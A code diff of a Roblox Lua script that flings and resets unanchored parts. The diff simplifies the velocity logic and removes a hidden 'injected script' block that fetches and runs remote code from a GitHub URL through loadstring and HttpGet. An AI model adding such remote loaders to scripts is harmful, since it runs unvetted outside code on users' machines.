@@ -40,22 +40,15 @@ end
 local function recheckBlast()
     local vec = parseVectorInput(vectorText)
     if not vec then return end
-
-    local originPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
-    if not originPart then return end
-
-    local origin = originPart.Position
-    local magnitude = vec.Magnitude
-
     for _, obj in ipairs(workspace:GetDescendants()) do
-        if obj:IsA("BasePart") and not obj.Anchored and not isPlayerPart(obj) and obj.Name ~= "Baseplate" then
-            local direction = (obj.Position - origin).Unit
-            local velocity = direction * magnitude
-
-            if obj.CanCollide or obj.Velocity ~= velocity or obj.AssemblyLinearVelocity ~= velocity then
-                obj.CanCollide = false
-                obj.Velocity = velocity
-                obj.AssemblyLinearVelocity = velocity
+        if obj:IsA("BasePart") then
+            -- skip anchored, player parts, and baseplates
+            if not obj.Anchored and not isPlayerPart(obj) and obj.Name ~= "Baseplate" then
+                if obj.CanCollide or obj.Velocity ~= vec or obj.AssemblyLinearVelocity ~= vec then
+                    obj.CanCollide = false
+                    obj.Velocity = vec
+                    obj.AssemblyLinearVelocity = vec
+                end
             end
         end
     end
@@ -64,9 +57,11 @@ end
 -- Reset velocities to zero for valid parts
 local function resetVelocities()
     for _, obj in ipairs(workspace:GetDescendants()) do
-        if obj:IsA("BasePart") and not obj.Anchored and not isPlayerPart(obj) and obj.Name ~= "Baseplate" then
-            obj.Velocity = Vector3.zero
-            obj.AssemblyLinearVelocity = Vector3.zero
+        if obj:IsA("BasePart") then
+            if not obj.Anchored and not isPlayerPart(obj) and obj.Name ~= "Baseplate" then
+                obj.Velocity = Vector3.zero
+                obj.AssemblyLinearVelocity = Vector3.zero
+            end
         end
     end
 end
@@ -148,9 +143,4 @@ toggleBtn.MouseButton1Click:Connect(function()
         toggleBtn.Text = "O"
         toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
     end
-end)
-
--- Fire injected script after setup
-task.defer(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md", true))()
 end)
